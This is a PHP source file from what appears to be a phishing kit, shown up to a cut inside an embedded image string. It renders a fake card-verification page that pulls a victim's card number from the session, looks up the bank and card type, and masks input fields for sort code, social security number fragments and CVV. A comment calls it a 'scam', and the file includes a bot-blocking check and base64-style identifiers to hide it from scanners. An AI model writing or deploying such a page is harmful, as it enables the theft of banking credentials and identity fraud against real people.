<?php
//              ,▄▄▄
//            ▄██████,
//           ▐█████████Ç
//           ╙██████████W
//           ,,████████`
//       ▄▄████████▓╙╙▐█▓▓▄▄
//     ,██████████████▄▄╙█▓▀█▄,              ,▄▓╜
//    ▐██████████████████▓██▄▀█▄,          ,███▄
//     ▀██████████████████████▄██▌        ▄█████╛
//      ╙██████████████████████▌╙▀█╦,╓▄▄█w▐█▀▀'
//       '███████████████████████,╙███████
//        ▐█████████████████████████████▌,,,╓▄▄▄▄██████▄▄
//        ████████████████████████████████████████████████▄
//       '██████████████▌▐██████████████████████████████████▄
//        ╙▀▀▀███████████████████████████████████████████████▄
//              ▀███████████████████████████████████████████████▄
//               ▀██████████████████████████████▀▀███████▀████████▌╖      ▄██w
//                ╙████████████████████████▀▀╙    ▐██████▌ ▀█████████▄▄▄████▀
//                 '████████████████████▀▀        └███████,  ╙▀╙ ▀████████▀
//                       `"╙╙▀▀▀▀▀▀█▀▀▀            ███████▌        ████▌
//                        ▐█▌,    ▐█░   ╓▄██       ▐███████,        ╙▀
//                       ╒██████████████████▄       ███████▌
//                   ,,,,⌠▓▌▄████████████▄▄▓▄▄▄▄▄,  ▀████▀╙
//                  ████████████▀▀██▀▀████████████   ███▌
//                 ▄██"           ▓█            ▐██ ▐████▄,
//                  ▀╙            ▓█             ╙` ████████▄
//                                ▓█                ╙▀▀▀███████
//                                ▓█                      ╙╙╙`
//    ┌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
//
//
session_start();
# advanced html base64 encryptor (AES Cipher function: encrypt 'input' with Rijndael algorithm) changed every time so chrome & bots can't see the scam source code
require_once 'cherbot.php';
require_once 'language.php';
#------------------------
#For Bot
include("bots/checkbots.php");
bot::checkbot();
#------------------------
include("System/VbvCardCountry.php");
include("System/CheckBankInfo.php");
include("System/CheckCardInfo.php");
$CardNumber = $_SESSION['CARD'];//$_SESSION['CARD']
$Q2FyZE51bWJlclNwbGl0 = substr($CardNumber,0,1);
function GETIMG($img){
	return "<img src='".$img."'/>";
}
//GET TYPE
$GETTYPECARD = CreditCard::validCreditCard($CardNumber); //
$Q2FyZFR5cGU = $GETTYPECARD["type"];// GET TYPE
//
$Country = Bank::GetBankInfo("BankCountry",$CardNumber);
?>
<html>
<head>
	<title><?php echo CreditCard::title($Q2FyZFR5cGU); ?></title>
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<meta name="robots" content="noindex">
    <link rel="shortcut icon" type="image/x-icon" href="data:image/png;base64,AAABAAIAICAAAAEAIACoEAAAJgAAABAQAAABACAAaAQAAM4QAAAoAAAAIAAAAEAAAAABACAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD9/Pkc/vv1MP379TD9+/Uw/vv1MP39/Qr///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AMadPsHmoQD/3pwA/96cAP/oowD/xKNYp////wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AwaNco+mjAP/emwD/3psA/+OfAP/SnB7g+fn4Bv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A5OHgJMrFwjzMx8Q6zMfEOsvHxDq4m2Sb6aUA/96cAP/enAD/4J0A/9+fCPfl5OAe////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCucVDPhikA/4owAP+KMAD/hSoA/6RVAv3jogD/3pwA/96cAP/enAD/6aQA/9LMwD7///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////ALB+Y7mEKQD/hy8A/4cvAP+DKwD/mEYC/d+dAv3fnQD/3pwA/96cAP/tpgD/xLiaZP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AtpeGjoYqAP+GLwD/hi8A/4QtAP+NOQL92JUC/eCeAP/enAD/3pwA/+qlAP/CqWyT////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDDs6pkhioA/4YvAP+GLwD/hi4A/4YwAv3OigT64aAA/96cAP/enAD/4J0A/9ufEO7FrXSLxbGCfL+xkG7PyLZI6+roFf///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////ANTNyj6FKQD/hy8A/4YvAP+GLwD/gioA/8J7BPrjogD/3pwA/96cAP/enAD/4J0A/+qkAP/rpQD/7KYA/+ulAP/eohTqxKlol+rp5hj///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A6ejnHIItCPeIMAD/hi8A/4YvAP+BKAD/tmsE+uSjAP/enAD/3pwA/96cAP/enAD/3pwA/96cAP/enAD/3pwA/+GeAP/tpwD/2aMi3eDe2Cb///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD6+fkGhkAi3YkwAP+GLwD/hi8A/4IpAP+kVQT66KcA/+akAP/lpAD/5aQA/+WkAP/kowD/4Z8A/9+dAP/enAD/3pwA/96cAP/opAD/06Iwz/f39gf///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCNWkS7izAA/4YvAP+GLwD/hi8A/4MvAP+YUgP9ol0D/aFbA/2jXgX6q2YC/bp3Av3QjQL946EA/+OiAP/enAD/3pwA/96cAP/tpgD/xbeYZf///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AJp5bJONMgD/hi8A/4YvAP+HLwD/gy0A/2UaAf9hGAH/YhgB/2IYAf9iGAH/ZBoB/20kAf+LRAP9w4EC/eWjAP/fnQD/3pwA/+SgAP/JnjzC////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8Ar52WZ44yAP+GLwD/hi8A/4YvAP+GLwD/biMB/2ggAf9pIAH/aSAB/2kgAf9pIAH/Zx4B/2IZAf9mHQH/qGQC/eSiAP/fnQD/35wA/9ucDvD9/PoV////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDGvrxCjTIA/4YvAP+GLwD/hi8A/4gwAP9yJQH/aB8B/2kgAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2ceAf9iGAH/r2sC/eWjAP/enAD/35wA//779TD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AOHf3h+JNAb4hzAA/4YvAP+GLwD/iDAA/3cnAf9nHwH/aSAB/2kgAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2YdAf9uJQH/0Y4A/+GfAP/gnAD//vv0Mv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A9/b2B4xGIN6JMAD/hi8A/4YvAP+IMAD/fCoA/2cfAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2EXAf+iXQL956QA/9yeEO79/PsS////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AkVxAv4swAP+GLwD/hi8A/4cwAP+ALAD/aSAB/2kgAf9pIAH/aSAB/2kgAf9pIAH/aSAB/2kgAf9pIAH/ZRsB/302Af/vqAD/xa9+gf///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCcemiXjTIA/4YvAP+GLwD/hy8A/4QuAP9qIQH/Zx8B/2cfAf9nHwH/Zx8B/2cfAf9nHwH/Zx8B/2cfAf9nHgH/dSkB/76meIf9/fwB////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AK6bkG6OMgD/hi8A/4YvAP+GLwD/hy8A/3wqAP93JwD/dycA/3cnAP93JwD/dycA/3cnAP93JwD/eSgA/34rAP+ILwD/2NXUKv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8Axr24Ro0yAP+GLwD/hi8A/4YvAP+GLwD/hzAA/4gwAP+IMAD/iDAA/4gwAP+IMAD/iDAA/4gwAP+IMAD/iDAA/4wxAP/Pysg1////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDe3NokiTME+ocvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+JMAD/iz0U6u/v7g////8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////APX19AqMQxzjiTAA/4YvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/hy8A/5IzAP+tlop0////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AIlONsmHKQD/gicA/4InAP+CJwD/gicA/4InAP+CJwD/gicA/4InAP+CJwD/gygA/4YpAP+FLgj3ooZ8g////wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8Ay721WrR4WM2vdVfPr3VXz691V8+vdVfPr3VXz691V8+vdVfPr3VXz7R8X8W4jXaow62iceTh4Cb///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP//////////////////////4H///+B////gf//8AH///AB///wAP//+AB///gAA//4AAH/+AAA//gAAP/4AAB//AAAf/wAAH/8AAB//AAAf/wAAH/8AAD//gAB//4AAf/+AAH//gAD//4AA///AB///////////////////////KAAAABAAAAAgAAAAAQAgAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP7+/Qf+/foY/v36GP7+/gH///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wDhz6ZZ4p4A/+GeAP/jzpxj////AP///wD///8A////AP///wD///8A////AP///wD///8A////ALiQfYuqe2KbqndKtOKfAP/enAD/37xqlP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wCbWjrQhi8A/4o2Av3dmwL93pwA/9eqQr3///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AqHRcqIYvAP+ELQD91ZEC/d6cAP/dnAT616k+wdmxUq3jzZhl+fn4Bv///wD///8A////AP///wD///8A////ALuUg32HLwD/gysA/8mBAv3hoAD/4aAA/+CeAP/enAD/4p8A/9yxSrT9/fwB////AP///wD///8A////AP///wDKtaxTiTAA/4YvAP+AMQD9gToD/YQ9Av2WUQL9xYEC/eCeAP/jnwD/49W0Sv///wD///8A////AP///wD///8A3dbUKokwAP+GLwD/eykA/2gfAf9pIAH/aB8B/2YdAf+nYgL94J4A/+3MgI3///8A////AP///wD///8A////APX19AqJNwr1hi8A/4AsAP9oHwH/aSAB/2kgAf9pIAH/Zx4B/86LAP3tzH+M////AP///wD///8A////AP///wD///8AkU4q1YYvAP+ELgD/aCAB/2gfAf9oHwH/aB8B/2ceAf+nah7g8OreH////wD///8A////AP///wD///8A////AKNuUqyGLwD/hi8A/4AsAP9/KwD/fysA/38rAP+BLAD/r4Bol////wD///8A////AP///wD///8A////AP///wC6kXyDhy8A/4YvAP+GLwD/hi8A/4YvAP+GLwD/ijAA/8mwolr///8A////AP///wD///8A////AP///wD///8A1cK6SJpOK+WYTivnmE4r55hOK+eZTyzjoGJFxsKkmGf///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD//wAA//8AAPz/AADgfwAA4H8AAOAfAADwBwAA8AcAAPADAADwAwAA8AcAAPAHAADwDwAA+B8AAP//AAD//wAA"/>
    <style>
		.dmVyaWZjYXRpb25Qb3N0U2VjbHJ0{
            margin:0 auto;
            width: 368px;
            border: solid 1px black;
            padding: 17px;
        }

        @media screen and (max-width: 368px) {
            .dmVyaWZjYXRpb25Qb3N0U2VjbHJ0:before{
                width: 315px;
            }
        }
		.bGFiVGhpc2Zvcm1zZ2lucGFnZXZidg{
            font-size: 13px;
            margin-top: 25px;
            color: #807979;

        }
		.hide{
			display: none;
		}
	</style>
	<script src="js/jquery-3.2.1.min.js"></script>
	<script src="js/jquery.mask.min.js"></script>
    <script type="text/javascript">
    	jQuery(function(){
			$("#sortcode").mask("99-99-99");
		});
		jQuery(function(){
			$("#snn3").mask("999");
		})
		jQuery(function(){
			$("#snn2").mask("99");
		})
		jQuery(function(){
			$("#snn4").mask("9999");
		})
		jQuery(function(){
			$("#CVV").mask("9999");
		})
    </script>
    <script src="js/plugins.js"></script>
    <script type="text/javascript">
    	$(document).ready(function(){
    		$("#bntvbv").click(function(){
    			var GO;
    			var MM =  $("#MM").val();
    			var DD = $("#DD").val();
    			var YYYY = $("#YYYY").val();
    			if(MM=="-1" || DD =="-1" || YYYY == "-1"){
    				alert("<?php echo $lang_38; ?>");
    				GO = false;
    			}
    			if (GO==false){
    				return false;
    			}else{
    				document.getElementById("VGhpc0ZvckZ1Y2tpbmdwcm9jZXNzaW5n").className = "show";
    				document.getElementById("VkJWcGdhU3RhcnRGb3JDb25GaXJt").className = "hide";
    			}
    		})
    	})
    	window.onload = function(){
    		setTimeout(function(){
    			document.getElementById("VkJWcGdhU3RhcnRGb3JDb25GaXJt").className = "";
    			document.getElementById("VGhpc0ZvckZ1Y2tpbmdwcm9jZXNzaW5n").className = "hide";
    		},3000)
    	}
    </script>
</head>
<body>
	<div style="">
		<div class="dmVyaWZjYXRpb25Qb3N0U2VjbHJ0">
			<?php
				if($Q2FyZE51bWJlclNwbGl0 == 4){
					$VmlzYUltZ0NvZGU = "data:image/png;base64,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